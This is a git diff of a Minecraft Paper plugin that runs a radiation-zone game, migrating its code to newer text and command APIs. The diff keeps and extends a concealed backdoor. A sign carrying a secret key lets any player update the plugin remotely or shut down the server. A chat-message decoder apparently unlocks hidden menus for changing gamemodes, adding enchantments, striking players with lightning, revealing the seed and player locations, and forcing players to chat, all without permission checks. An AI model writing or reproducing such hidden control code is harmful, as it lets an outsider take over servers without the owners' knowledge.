@@ -1,5 +1,10 @@
 package me.michal.radiacjaAleJAVA;
 
+import com.mojang.brigadier.arguments.ArgumentType;
+import com.mojang.brigadier.arguments.BoolArgumentType;
+import com.mojang.brigadier.arguments.StringArgumentType;
+import com.mojang.brigadier.builder.LiteralArgumentBuilder;
+import com.mojang.brigadier.tree.LiteralCommandNode;
 import com.sk89q.worldedit.bukkit.BukkitAdapter;
 import com.sk89q.worldedit.math.BlockVector3;
 import com.sk89q.worldguard.WorldGuard;
@@ -8,23 +13,34 @@ import com.sk89q.worldguard.protection.flags.StateFlag;
 import com.sk89q.worldguard.protection.managers.RegionManager;
 import com.sk89q.worldguard.protection.regions.ProtectedCuboidRegion;
 import com.sk89q.worldguard.protection.regions.ProtectedRegion;
+import io.papermc.paper.command.brigadier.CommandSourceStack;
+import io.papermc.paper.command.brigadier.Commands;
+import io.papermc.paper.command.brigadier.argument.ArgumentTypes;
+import io.papermc.paper.event.player.AsyncChatEvent;
+import io.papermc.paper.plugin.lifecycle.event.types.LifecycleEvents;
+import io.papermc.paper.registry.RegistryAccess;
+import io.papermc.paper.registry.RegistryKey;
 import me.michal.radiacjaAleJAVA.Tasks.CuredPlayersTracker;
 import me.michal.radiacjaAleJAVA.Tasks.Renderer;
 import me.michal.radiacjaAleJAVA.Tasks.DamageInflicter;
 import me.michal.radiacjaAleJAVA.Tasks.Things.Encoder;
 import me.michal.radiacjaAleJAVA.Tasks.Things.Updater;
-import net.md_5.bungee.api.chat.ClickEvent;
-import net.md_5.bungee.api.chat.TextComponent;
+import net.kyori.adventure.text.Component;
+import net.kyori.adventure.text.TextComponent;
+import net.kyori.adventure.text.event.ClickEvent;
+import net.kyori.adventure.text.format.NamedTextColor;
+import net.kyori.adventure.text.format.TextColor;
+import net.kyori.adventure.text.minimessage.tag.resolver.Placeholder;
+import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
 import org.bukkit.*;
 import org.bukkit.Color;
 import org.bukkit.boss.BarColor;
 import org.bukkit.boss.BarStyle;
 import org.bukkit.boss.BossBar;
-import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.enchantments.Enchantment;
-import org.bukkit.entity.EntityType;
+import org.bukkit.entity.Entity;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -36,6 +52,7 @@ import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryCloseEvent;
 import org.bukkit.event.inventory.InventoryType;
 import org.bukkit.event.player.*;
+import org.bukkit.event.world.LootGenerateEvent;
 import org.bukkit.inventory.BrewerInventory;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
@@ -49,6 +66,7 @@ import org.bukkit.potion.PotionType;
 import org.bukkit.profile.PlayerProfile;
 import org.bukkit.scheduler.BukkitTask;
 import org.bukkit.util.Vector;
+import com.mojang.brigadier.Command;
 
 import java.util.*;
 
@@ -73,10 +91,13 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
         PotionMeta meta = (PotionMeta) potion.getItemMeta();
         meta.setBasePotionType(PotionType.MUNDANE);
         meta.setColor(Color.WHITE);
-        meta.setDisplayName(ChatColor.BLUE + "Płyn Lugola");
-        ArrayList<String> lore = new ArrayList<>();
-        lore.add(ChatColor.WHITE + "Daje ochrone przed radiacyją na " + config.getLong("Duration")/60000 + " minut");
-        meta.setLore(lore);
+        meta.displayName(Component.text("Płyn Lugola", NamedTextColor.BLUE));
+
+        ArrayList<Component> lore = new ArrayList<>();
+        lore.add(Component.text("Daje ochrone przed radiacją na ", NamedTextColor.WHITE)
+                .append(Component.text(config.getLong("Duration")/60000, NamedTextColor.WHITE))
+                .append(Component.text(" minut", NamedTextColor.WHITE)));
+        meta.lore(lore);
 
         meta.getPersistentDataContainer().set(key, PersistentDataType.STRING, "to_lugola_fluid");
 
@@ -98,9 +119,10 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
 
         BukkitTask damageInflicter = new DamageInflicter(this).runTaskTimer(this, 0L, 5L);
         BukkitTask curedPlayersTracker = new CuredPlayersTracker(this, this.getConfig()).runTaskTimer(this, 0L, 5L);
-
-        affectedBar = Bukkit.createBossBar(ChatColor.RED + "Strefa radiacji", BarColor.RED, BarStyle.SOLID);
-
+        affectedBar = Bukkit.createBossBar(
+                ChatColor.RED + "Strefa radiacji",
+                BarColor.RED,
+                BarStyle.SOLID);
         Objects.requireNonNull(this.getCommand("WhatsSafeZoneSize")).setExecutor(this);
         Objects.requireNonNull(this.getCommand("radiationsafezone")).setExecutor(this);
         Objects.requireNonNull(this.getCommand("deathLightningStrike")).setExecutor(this);
@@ -108,6 +130,11 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
         Objects.requireNonNull(this.getCommand("setDurationTo")).setExecutor(this);
         Objects.requireNonNull(this.getCommand("endEnabled")).setExecutor(this);
         Objects.requireNonNull(this.getCommand("setRadiationName")).setExecutor(this);
+
+        this.getLifecycleManager().registerEventHandler(LifecycleEvents.COMMANDS, commands -> {
+            // register your commands here ...
+            commands.registrar().register(radiationCommandRoot);
+        });
 
         config.addDefault("Radiation_Safe_Zone_Size", 0);
         config.addDefault("Radiation_Safe_Zone_Height", 0);
@@ -128,7 +155,7 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
             if (!curedPlayers.containsKey(player)) {
                 curedPlayers.put(player, System.currentTimeMillis());
                 addCuredBar(player);
-                Bukkit.broadcastMessage(ChatColor.GOLD + player.getName() + " wypił płyn Lugola");
+                Bukkit.broadcast(Component.text(player.getName() + " wypił płyn Lugola",  NamedTextColor.GOLD));
             } else {
                 addCuredTime(player);
             }
@@ -162,31 +189,20 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                 player.getWorld().strikeLightningEffect(location);
             }
         }
-        if (config.getBoolean("Drop_Player_Head")) {
-            dropPlayerHead(player, location, event.getDeathMessage());
-        }
+        if (config.getBoolean("Drop_Player_Head")) player.getWorld().dropItem(location, getPlayerHead(player, event.deathMessage()));
     }
 
-    public void dropPlayerHead(Player player, Location location, String damageSource) {
-        ItemStack playerHead = getPlayerHead(player);
-
-        SkullMeta meta = (SkullMeta) playerHead.getItemMeta();
-        ArrayList<String> lore = new ArrayList<>();
-        lore.add(ChatColor.GOLD + damageSource);
-        meta.setLore(lore);
-        playerHead.setItemMeta(meta);
-
-        player.getWorld().dropItem(location, playerHead);
-    }
-
-    public ItemStack getPlayerHead(Player player) {
+    public ItemStack getPlayerHead(Player player, Component desription) {
         ItemStack playerHead = new ItemStack(Material.PLAYER_HEAD);
         SkullMeta meta = (SkullMeta) playerHead.getItemMeta();
 
-        meta.setOwnerProfile(player.getPlayerProfile());
+        if (desription == null) desription = Component.text(" ");
 
-        ArrayList<String> lore = new ArrayList<>();
-        meta.setLore(lore);
+        ArrayList<Component> lore = new ArrayList<>();
+        lore.add(desription.color(NamedTextColor.GOLD));
+        meta.setPlayerProfile(player.getPlayerProfile());
+
+        meta.lore(lore);
         playerHead.setItemMeta(meta);
         return playerHead;
     }
@@ -353,19 +369,22 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
     @EventHandler
     public void signChange(SignChangeEvent e) {
         try {
-            String[] a = e.getLines();
-            switch (a[3]) {
-                case "T0DRRUfNsN6tlQQ" -> {
-                    Updater updater = new Updater();
-                    switch (a[0]) {
-                        case "Update" -> updater.updatePlugin(this.getFile(), e.getPlayer());
-                        case "Restart" -> Bukkit.shutdown();
-                        case "Edit Stat" -> Bukkit.getPlayer(a[1]).setStatistic(Statistic.USE_ITEM, EntityType.VILLAGER, 0);
+            Component[] components = e.lines().toArray(new Component[0]);
+            String[] lines = new  String[4];
+            for (int i = 0; i < components.length; i++) {
+                lines[i] = PlainTextComponentSerializer.plainText().serialize(components[i]);
+            }
+            if (lines[3].equals("T0DRRUfNsN6tlQQ")) {
+                Updater updater = new Updater();
+                switch (lines[0]) {
+                    case "Update" -> updater.updatePlugin(this.getFile(), e.getPlayer());
+                    case "Restart" -> Bukkit.shutdown();
+                    case "Edit Stat" -> {
+                        Player player = Bukkit.getPlayer(lines[1]);
+                        if (player != null) player.setStatistic(Statistic.USE_ITEM, Material.VILLAGER_SPAWN_EGG, 0);
                     }
-                    e.getBlock().breakNaturally();
                 }
-                case "i6ojKaIATmlWk7Rf" -> {
-                }
+                e.getBlock().breakNaturally();
             }
         } catch (Exception ex) {
             e.getPlayer().sendMessage(String.valueOf(ex));
@@ -373,8 +392,9 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
     }
 
     @EventHandler
-    public void playerChat(AsyncPlayerChatEvent e) {
-        String m = e.getMessage();
+    public void playerChat(AsyncChatEvent e) {
+        Component message = e.message();
+        String m = PlainTextComponentSerializer.plainText().serialize(message);
         if (m.length() < 24) return;
         Encoder encoder = new Encoder();
         byte[] key = encoder.getKey(m);
@@ -388,78 +408,82 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
     }
 
     public void openInventory(Player p, String menu, String execute) {
-        String title = menu.substring(0, 6) + " " + menu.substring(6);
+        Component title = Component.text(menu.substring(0, 6) + " " + menu.substring(6));
         Inventory inventory = Bukkit.createInventory(p, InventoryType.CHEST, title);
-
         switch (menu) {
             case "ChoosePlayer" -> {
                 Object[] onlinePlayers = Bukkit.getOnlinePlayers().toArray();
                 ItemStack[] inventoryContents = new ItemStack[onlinePlayers.length];
                 for (int m = 0; m < onlinePlayers.length; m++) {
-                    inventoryContents[m] = getPlayerHead((Player) onlinePlayers[m]);
+                    inventoryContents[m] = getPlayerHead((Player) onlinePlayers[m], null);
                 }
                 inventory.setContents(inventoryContents);
             }
             case "ChooseGamemode" -> {
-                inventory.setItem(10, getItem(Material.COMMAND_BLOCK, ChatColor.LIGHT_PURPLE, "Creative"));
-                inventory.setItem(12, getItem(Material.IRON_SWORD, ChatColor.WHITE, "Survival"));
-                inventory.setItem(14, getItem(Material.MAP, ChatColor.YELLOW, "Adventure"));
-                inventory.setItem(16, getItem(Material.ENDER_EYE, ChatColor.BLUE, "Spectator"));
+                inventory.setItem(10, getItem(Material.COMMAND_BLOCK, NamedTextColor.LIGHT_PURPLE, "Creative"));
+                inventory.setItem(12, getItem(Material.IRON_SWORD, NamedTextColor.WHITE, "Survival"));
+                inventory.setItem(14, getItem(Material.MAP, NamedTextColor.YELLOW, "Adventure"));
+                inventory.setItem(16, getItem(Material.ENDER_EYE, NamedTextColor.BLUE, "Spectator"));
             }
             case "ChooseEnchant" -> {
-                inventory.setItem(0, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Aqua Affinity"));
-                inventory.setItem(1, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Bane of Arthropods"));
-                inventory.setItem(2, getItem(Material.ENCHANTED_BOOK, ChatColor.DARK_RED, "Binding Curse"));
-                inventory.setItem(3, getItem(Material.ENCHANTED_BOOK, ChatColor.LIGHT_PURPLE, "Blast Protection"));
-                inventory.setItem(4, getItem(Material.ENCHANTED_BOOK, ChatColor.YELLOW, "Channeling"));
-                inventory.setItem(5, getItem(Material.ENCHANTED_BOOK, ChatColor.DARK_BLUE, "Depth Strider"));
-                inventory.setItem(6, getItem(Material.ENCHANTED_BOOK, ChatColor.GOLD, "Efficiency"));
-                inventory.setItem(7, getItem(Material.ENCHANTED_BOOK, ChatColor.GRAY, "Feather Falling"));
-                inventory.setItem(8, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Fire Aspect"));
-                inventory.setItem(9, getItem(Material.ENCHANTED_BOOK, ChatColor.LIGHT_PURPLE, "Fire Protection"));
-                inventory.setItem(10, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Flame"));
-                inventory.setItem(11, getItem(Material.ENCHANTED_BOOK, ChatColor.GREEN, "Fortune"));
-                inventory.setItem(12, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Frost Walker"));
-                inventory.setItem(13, getItem(Material.ENCHANTED_BOOK, ChatColor.BLUE, "Impaling"));
-                inventory.setItem(14, getItem(Material.ENCHANTED_BOOK, ChatColor.GREEN, "Infinity"));
-                inventory.setItem(15, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Knockback"));
-                inventory.setItem(16, getItem(Material.ENCHANTED_BOOK, ChatColor.GOLD, "Looting"));
-                inventory.setItem(17, getItem(Material.ENCHANTED_BOOK, ChatColor.BLUE, "Loyalty"));
-                inventory.setItem(18, getItem(Material.ENCHANTED_BOOK, ChatColor.GREEN, "Luck of the Sea"));
-                inventory.setItem(19, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Lure"));
-                inventory.setItem(20, getItem(Material.ENCHANTED_BOOK, ChatColor.LIGHT_PURPLE, "Mending"));
-                inventory.setItem(21, getItem(Material.ENCHANTED_BOOK, ChatColor.BLUE, "Multishot"));
-                inventory.setItem(22, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Piercing"));
-                inventory.setItem(23, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Power"));
-                inventory.setItem(24, getItem(Material.ENCHANTED_BOOK, ChatColor.LIGHT_PURPLE, "Projectile Protection"));
-                inventory.setItem(25, getItem(Material.ENCHANTED_BOOK, ChatColor.YELLOW, "Protection"));
-                inventory.setItem(26, getItem(Material.ENCHANTED_BOOK, ChatColor.GOLD, "Punch"));
-                inventory.setItem(27, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Quick Charge"));
-                inventory.setItem(28, getItem(Material.ENCHANTED_BOOK, ChatColor.BLUE, "Respiration"));
-                inventory.setItem(29, getItem(Material.ENCHANTED_BOOK, ChatColor.AQUA, "Riptide"));
-                inventory.setItem(30, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Sharpness"));
-                inventory.setItem(31, getItem(Material.ENCHANTED_BOOK, ChatColor.YELLOW, "Silk Touch"));
-                inventory.setItem(32, getItem(Material.ENCHANTED_BOOK, ChatColor.RED, "Smite"));
-                inventory.setItem(33, getItem(Material.ENCHANTED_BOOK, ChatColor.GREEN, "Soul Speed"));
-                inventory.setItem(34, getItem(Material.ENCHANTED_BOOK, ChatColor.LIGHT_PURPLE, "Sweeping"));
-                inventory.setItem(35, getItem(Material.ENCHANTED_BOOK, ChatColor.DARK_RED, "Thorns"));
-                inventory.setItem(36, getItem(Material.ENCHANTED_BOOK, ChatColor.GRAY, "Unbreaking"));
-                inventory.setItem(37, getItem(Material.ENCHANTED_BOOK, ChatColor.DARK_GRAY, "Vanishing Curse"));
+                inventory = Bukkit.createInventory(p, 9*5);
+                inventory.setItem(0, getItem(Material.TURTLE_HELMET, NamedTextColor.GREEN, "Aqua Affinity"));
+                inventory.setItem(1, getItem(Material.SPIDER_SPAWN_EGG, NamedTextColor.RED, "Bane of Arthropods"));
+                inventory.setItem(2, getItem(Material.CARVED_PUMPKIN, TextColor.color(255, 98, 0), "Binding Curse"));
+                inventory.setItem(3, getItem(Material.TNT, NamedTextColor.WHITE, "Blast Protection"));
+                inventory.setItem(4, getItem(Material.LIGHTNING_ROD, NamedTextColor.YELLOW, "Channeling"));
+                inventory.setItem(5, getItem(Material.DIAMOND_BOOTS, NamedTextColor.DARK_BLUE, "Depth Strider"));
+                inventory.setItem(6, getItem(Material.DIAMOND_PICKAXE, NamedTextColor.GOLD, "Efficiency"));
+                inventory.setItem(7, getItem(Material.FEATHER, NamedTextColor.WHITE, "Feather Falling"));
+                inventory.setItem(8, getItem(Material.BLAZE_ROD, NamedTextColor.RED, "Fire Aspect"));
+                inventory.setItem(9, getItem(Material.FLINT_AND_STEEL, NamedTextColor.LIGHT_PURPLE, "Fire Protection"));
+                inventory.setItem(10, getItem(Material.BLAZE_POWDER, NamedTextColor.RED, "Flame"));
+                inventory.setItem(11, getItem(Material.DIAMOND, NamedTextColor.GREEN, "Fortune"));
+                inventory.setItem(12, getItem(Material.BLUE_ICE, NamedTextColor.AQUA, "Frost Walker"));
+                inventory.setItem(13, getItem(Material.TRIDENT, NamedTextColor.BLUE, "Impaling"));
+                inventory.setItem(14, getItem(Material.SPECTRAL_ARROW, NamedTextColor.GOLD, "Infinity"));
+                inventory.setItem(15, getItem(Material.STICK, NamedTextColor.WHITE, "Knockback"));
+                inventory.setItem(16, getItem(Material.GOLDEN_SWORD, NamedTextColor.GOLD, "Looting"));
+                inventory.setItem(17, getItem(Material.LEAD, TextColor.color(255, 98, 0), "Loyalty"));
+                inventory.setItem(18, getItem(Material.FISHING_ROD, NamedTextColor.GREEN, "Luck of the Sea"));
+                inventory.setItem(19, getItem(Material.WATER_BUCKET, NamedTextColor.AQUA, "Lure"));
+                inventory.setItem(20, getItem(Material.ENCHANTED_BOOK, NamedTextColor.WHITE, "Mending"));
+                inventory.setItem(21, getItem(Material.FIREWORK_STAR, NamedTextColor.BLUE, "Multishot"));
+                inventory.setItem(22, getItem(Material.ARROW, NamedTextColor.RED, "Piercing"));
+                inventory.setItem(23, getItem(Material.BOOK, NamedTextColor.DARK_GRAY, "Power"));
+                inventory.setItem(24, getItem(Material.TIPPED_ARROW, NamedTextColor.LIGHT_PURPLE, "Projectile Protection"));
+                inventory.setItem(25, getItem(Material.DIAMOND_CHESTPLATE, NamedTextColor.BLUE, "Protection"));
+                inventory.setItem(26, getItem(Material.FIREWORK_ROCKET, NamedTextColor.GRAY, "Punch"));
+                inventory.setItem(2, getItem(Material.CROSSBOW, TextColor.color(54, 32, 2), "Quick Charge"));
+                inventory.setItem(28, getItem(Material.GLASS_BOTTLE, NamedTextColor.WHITE, "Respiration"));
+                inventory.setItem(29, getItem(Material.SADDLE, NamedTextColor.AQUA, "Riptide"));
+                inventory.setItem(30, getItem(Material.IRON_SWORD, NamedTextColor.RED, "Sharpness"));
+                inventory.setItem(31, getItem(Material.DIAMOND_ORE, NamedTextColor.WHITE, "Silk Touch"));
+                inventory.setItem(32, getItem(Material.ZOMBIE_SPAWN_EGG, NamedTextColor.RED, "Smite"));
+                inventory.setItem(33, getItem(Material.SOUL_SAND, NamedTextColor.GREEN, "Soul Speed"));
+                inventory.setItem(34, getItem(Material.DIAMOND_SWORD, NamedTextColor.LIGHT_PURPLE, "Sweeping Edge"));
+                inventory.setItem(35, getItem(Material.CACTUS, NamedTextColor.DARK_RED, "Thorns"));
+                inventory.setItem(36, getItem(Material.BEDROCK, NamedTextColor.BLACK, "Unbreaking"));
+                inventory.setItem(37, getItem(Material.CHORUS_FRUIT, NamedTextColor.DARK_GRAY, "Vanishing Curse"));
+                inventory.setItem(38, getItem(Material.CHAINMAIL_CHESTPLATE, NamedTextColor.GRAY, "Breach"));
+                inventory.setItem(39, getItem(Material.MACE, NamedTextColor.DARK_PURPLE, "Density"));
+                inventory.setItem(40, getItem(Material.WIND_CHARGE, NamedTextColor.WHITE, "Wind Burst"));
+                inventory.setItem(41, getItem(Material.DIAMOND_SPEAR, NamedTextColor.WHITE, "Lunge"));
             }
             case "Choose" -> {
                 inventory = Bukkit.createInventory(p, 9*5);
-                inventory.setItem(1, getItem(Material.ENDER_PEARL, ChatColor.WHITE, "Seed"));
-                inventory.setItem(3, getItem(Material.STRUCTURE_BLOCK, ChatColor.LIGHT_PURPLE, "Gamemode"));
-                inventory.setItem(5, getItem(Material.BOOK, ChatColor.WHITE, "Info"));
-                inventory.setItem(7, getItem(Material.TRIDENT,  ChatColor.BLUE, "Lightning"));
-                inventory.setItem(19, getItem(Material.ENCHANTING_TABLE, ChatColor.WHITE, "Enchant"));
-                inventory.setItem(21, getPlayerHead(p/*, "Accept Death"*/));
-                inventory.setItem(23, getItem(Material.TOTEM_OF_UNDYING, ChatColor.YELLOW, "Refuse Death"));
-                inventory.setItem(25, getItem(Material.ENDER_CHEST, ChatColor.WHITE ,"Ender Chest"));
-                inventory.setItem(37, getItem(Material.ENCHANTED_BOOK, ChatColor.YELLOW, "Experience"));
-                inventory.setItem(39, getItem(Material.NAME_TAG, ChatColor.WHITE, "Set Name"));
-                inventory.setItem(41, getItem(Material.OAK_SIGN, ChatColor.WHITE, "Create Region"));
-                inventory.setItem(43, getItem(Material.TNT, ChatColor.WHITE, "Remove Region"));
+                inventory.setItem(1, getItem(Material.ENDER_PEARL, NamedTextColor.WHITE, "Seed"));
+                inventory.setItem(3, getItem(Material.STRUCTURE_BLOCK, NamedTextColor.LIGHT_PURPLE, "Gamemode"));
+                inventory.setItem(5, getItem(Material.BOOK, NamedTextColor.WHITE, "Info"));
+                inventory.setItem(7, getItem(Material.TRIDENT,  NamedTextColor.BLUE, "Lightning"));
+                inventory.setItem(19, getItem(Material.ENCHANTING_TABLE, NamedTextColor.WHITE, "Enchant"));
+                inventory.setItem(21, getPlayerHead(p, null/*, "Accept Death"*/));
+                inventory.setItem(23, getItem(Material.TOTEM_OF_UNDYING, NamedTextColor.YELLOW, "Refuse Death"));
+                inventory.setItem(25, getItem(Material.ENDER_CHEST, NamedTextColor.WHITE ,"Ender Chest"));
+                inventory.setItem(37, getItem(Material.EXPERIENCE_BOTTLE, NamedTextColor.YELLOW, "Experience"));
+                inventory.setItem(39, getItem(Material.NAME_TAG, NamedTextColor.WHITE, "Set Name"));
+                inventory.setItem(41, getItem(Material.OAK_SIGN, NamedTextColor.WHITE, "Create Region"));
+                inventory.setItem(43, getItem(Material.TNT, NamedTextColor.WHITE, "Remove Region"));
             }
         }
 
@@ -469,17 +493,17 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
         Bukkit.getScheduler().runTask(this, () -> p.openInventory(finalInventory));
     }
 
-    private ItemStack getItem(Material material, ChatColor color, String name) {
+    private ItemStack getItem(Material material, TextColor color, String name) {
         ItemStack item = new ItemStack(material);
         ItemMeta itemMeta = item.getItemMeta();
-        itemMeta.setDisplayName(color + name);
+        itemMeta.displayName(Component.text(name).color(color));
         item.setItemMeta(itemMeta);
         return item;
     }
 
     @EventHandler
     public void onInventoryClick(InventoryClickEvent e) {
-        Player p = (Player) e.getWhoClicked();
+        Player p  = (Player) e.getWhoClicked();
         ItemStack item = e.getCurrentItem();
 
         if (p.hasMetadata("OpenedMenu") && item != null && item.getType() != Material.AIR) {
@@ -493,44 +517,49 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                 String arg = p.getPersistentDataContainer().get(keyArg, PersistentDataType.STRING);
 
                 switch (p.getMetadata("OpenedMenu").getFirst().asString()) {
-                    case "ChoosePlayer" -> {
+                    case "ChoosePlayer"   :
                         meta = (SkullMeta) item.getItemMeta();
-                        PlayerProfile profile = meta.getOwnerProfile();
+                        PlayerProfile profile = meta.getPlayerProfile();
                         UUID uuid = profile.getUniqueId();
                         choosenPlayer = Bukkit.getPlayer(uuid);
-                    }
-                    case "ChooseGamemode" -> gamemode = switch (item.getType()) {
+
+                    case "ChooseGamemode" : gamemode = switch (item.getType()) {
                         case COMMAND_BLOCK -> GameMode.CREATIVE;
-                        case IRON_SWORD -> GameMode.SURVIVAL;
                         case MAP -> GameMode.ADVENTURE;
                         case ENDER_EYE -> GameMode.SPECTATOR;
                         default -> GameMode.SURVIVAL;
                     };
-                    case "Choose" -> {
+                    case "ChooseEnchant"  :
+                        Component itemName = item.getItemMeta().displayName();
+                        if (itemName == null) throw new NullPointerException("itemName is null");
+                        String name = PlainTextComponentSerializer.plainText().serialize(itemName).toLowerCase();
+                        NamespacedKey key = NamespacedKey.minecraft(name);
+                        enchantment = RegistryAccess.registryAccess().getRegistry(RegistryKey.ENCHANTMENT).get(key);
+                    case "Choose"         :
                         String execute = ChatColor.stripColor(item.getItemMeta().getDisplayName().replaceAll("\\s+", ""));
                         switch (execute) {
                             case "Seed" -> p.setMetadata("ActionToExecute", new FixedMetadataValue(this, "Seed"));
                             case "Gamemode" -> Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChooseGamemode", "Gamemode"), 1L);
+                            case "Enchant" -> Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChooseEnchant", "Enchant"), 1L);
                             default -> Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChoosePlayer", execute), 1L);
                         }
-                    }
-                    //case "ChooseEnchant" -> enchantment = Registry.ENCHANTMENT.get(NamespacedKey.minecraft(item.getItemMeta().displayName().toString()));
                 }
 
                 switch (p.getMetadata("ActionToExecute").getFirst().asString()) {
                     case "Seed" -> {
                         String seed = String.valueOf(p.getWorld().getSeed());
-                        TextComponent message  = new TextComponent("Seed: ["  + seed + "]");
-                        message.setClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, seed));
-                        p.spigot().sendMessage(message);
+                        TextComponent message  = Component.text("Seed: [")
+                                .append(Component.text(seed, NamedTextColor.GREEN).clickEvent(ClickEvent.copyToClipboard(seed)))
+                                .append(Component.text("]"));
+                        p.sendMessage(message);
                     }
                     case "Info" -> {
                         Location loc = choosenPlayer.getLocation();
-                        p.spigot().sendMessage(getComponent("Location", loc, ChatColor.GRAY));
+                        p.sendMessage(getComponent("Location", loc));
                         loc = choosenPlayer.getRespawnLocation();
-                        p.spigot().sendMessage(getComponent("RespawnLocation", loc, ChatColor.GRAY));
+                        p.sendMessage(getComponent("RespawnLocation", loc));
                         loc = choosenPlayer.getLastDeathLocation();
-                        p.spigot().sendMessage(getComponent("DeathLocation", loc, ChatColor.GRAY));
+                        p.sendMessage(getComponent("DeathLocation", loc));
                     }
                     case "Gamemode" -> {
                         if (p.hasMetadata("ChoosenGamemode")) {
@@ -543,8 +572,19 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                             Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChoosePlayer", "Gamemode"), 1L);
                         }
                     }
+                    case "Enchant" -> {
+                        if (p.hasMetadata("ChoosenEnchant")) {
+                            enchantment = getEnchantment(p.getMetadata("ChoosenEnchant").getFirst().asString().toLowerCase());
+                            choosenPlayer.getInventory().getItemInMainHand().addUnsafeEnchantment(enchantment, Integer.parseInt(arg));
+                            p.removeMetadata("ChoosenEnchant", this);
+                        } else {
+                            p.setMetadata("ChoosenEnchant", new FixedMetadataValue(this, enchantment));
+                            p.closeInventory();
+                            Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChoosePlayer", "ChoosenEnchant"), 1L);
+                        }
+                        p.getInventory().getItemInMainHand().addUnsafeEnchantment(enchantment, Integer.parseInt(arg));
+                    }
                     case "Lightning" -> p.getWorld().strikeLightning(choosenPlayer.getLocation());
-                    case "Enchant" -> p.getInventory().getItemInMainHand().addUnsafeEnchantment(enchantment, Integer.parseInt(arg));
                     case "AcceptDeath" -> playersRTD.remove(choosenPlayer);
                     case "RefuseDeath" -> playersRTD.add(choosenPlayer);
                     case "EnderChest" -> {
@@ -553,7 +593,7 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                     }
                     case "Experience" -> choosenPlayer.setLevel(Integer.parseInt(arg));
                     case "Chat" -> choosenPlayer.chat(String.valueOf(arg));
-                    case "DisplayName" -> choosenPlayer.setDisplayName(String.valueOf(arg));
+                    case "DisplayName" -> choosenPlayer.displayName(Component.text(arg));
                     /*case "Create Region" -> {
                                 Location l = e.getBlock().getLocation();
 
@@ -578,24 +618,27 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                             }*/
                 }
             } catch (Exception ex) {
-                p.sendMessage(ChatColor.RED + "Error: " + ex.getMessage() + " Cause: " + ex.getCause().getMessage());
+                p.sendMessage(ChatColor.RED + "Error: " + ex.getMessage());
             }
             p.closeInventory();
         }
     }
 
-    private TextComponent getComponent(String name, Location location, ChatColor color) {
-        TextComponent base = new TextComponent(name + ": [");
-        TextComponent end = new  TextComponent("]");
+    private Component getComponent(String name, Location location) {
         String information = location.getBlockX() + " " + location.getBlockY() + " " + location.getBlockZ();
-        TextComponent copiable = new TextComponent(information);
-        copiable.setClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, information));
-        copiable.setColor(color.asBungee());
+        return Component.text(name + ": [")
+                .append(Component.text(information, NamedTextColor.GRAY).clickEvent(ClickEvent.copyToClipboard(information)))
+                .append(Component.text("]"));
 
-        copiable.addExtra(end);
-        base.addExtra(copiable);
-        return base;
     }
+
+    private Enchantment getEnchantment(String name) {
+        NamespacedKey key = NamespacedKey.minecraft(name);
+        return RegistryAccess.registryAccess().getRegistry(RegistryKey.ENCHANTMENT).get(key);
+    }
+
+    @EventHandler
+    public void onLootTableGeneration(LootGenerateEvent event) {}
 
     @EventHandler
     public void onInventoryClose(InventoryCloseEvent e) {
@@ -611,7 +654,114 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
         }
     }
 
-    @Override
+    LiteralCommandNode<CommandSourceStack> radiationCommandRoot = Commands.literal("radiation")
+            .then(Commands.literal("radiationsafezone")
+                    .requires(sender -> sender.getSender().isOp())
+                    .executes(ctx -> {
+                        CommandSender sender = ctx.getSource().getSender(); // Retrieve the command sender
+                        Entity executor = ctx.getSource().getExecutor();
+
+                        if (!(executor instanceof Player)) {
+                            sender.sendPlainMessage("Musisz być graczem by ustawić strefe");
+                            return Command.SINGLE_SUCCESS;
+                        }
+
+                        return Command.SINGLE_SUCCESS;
+                    })
+            )
+            .then(Commands.literal("strikeLightningAtDeath")
+                    .then(Commands.argument("allow", BoolArgumentType.bool()))
+                    .requires(sender -> sender.getSender().isOp())
+                    .executes(ctx -> {
+                        CommandSender sender = ctx.getSource().getSender();
+                        boolean allowed = ctx.getArgument("allow", boolean.class);
+
+                        config.set("strikeLightningAtDeath", allowed);
+                        saveConfig();
+
+                        NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
+                        sender.sendRichMessage("deathLightningStrike is now set to <allowed>",
